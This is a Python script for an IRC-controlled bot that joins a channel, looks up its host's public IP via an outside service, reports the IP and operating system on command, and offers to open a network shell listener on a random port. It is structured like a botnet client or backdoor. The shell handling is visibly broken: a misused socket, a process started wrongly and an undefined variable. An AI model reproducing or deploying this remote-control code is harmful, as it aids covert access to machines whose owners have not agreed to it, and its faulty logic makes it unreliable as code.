#!/usr/bin/python3
# -*- coding: utf-8 -*-
import pydle
from requests import get
from multiprocessing import Process
import threading
import socket
import random
import pypsrp

ip = get('https://api.ipify.org').text

def shell(port):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        hote = ''
        print(hote)
        server.bind((hote,port))
        server.listen(5)
        server.accept()
        while (True):
            message = server.recv(1024).decode("utf8")
            if message == "!stop":
                server.send("Server stopping...".encode("utf8"))
                server.close()
                break
            if message == "":
                pass
    except OSError:
        server.close()  
    finally:
        server.close()

class MyOwnBot(pydle.Client):
    async def on_connect(self):
         await self.join('#net')

    async def on_message(self, target, source, message):
         # don't respond to our own messages, as this leads to a positive feedback loop
        if message == "!ip":
            await self.message(target, format(ip))

        if message == "!os":
            await self.message(target, getos())

        if message == "!spawn_shell":
            port = random.randint(1025,3000)
            message = "shell available on "+ip+":"+ str(port)
            await self.message(target, message)
            p = Process(target=shell(port))
            p.start()
        if message == "!stop_shell":
            p.terminate()
            p.join()
            message = "Shell stopped"
            await self.message(target, message)

def getos():
    import platform
    return platform.system()  
        
# def check_valid_key():

client = MyOwnBot("BoBiBot", realname="bot")
client.run('localhost', tls=False, tls_verify=False)

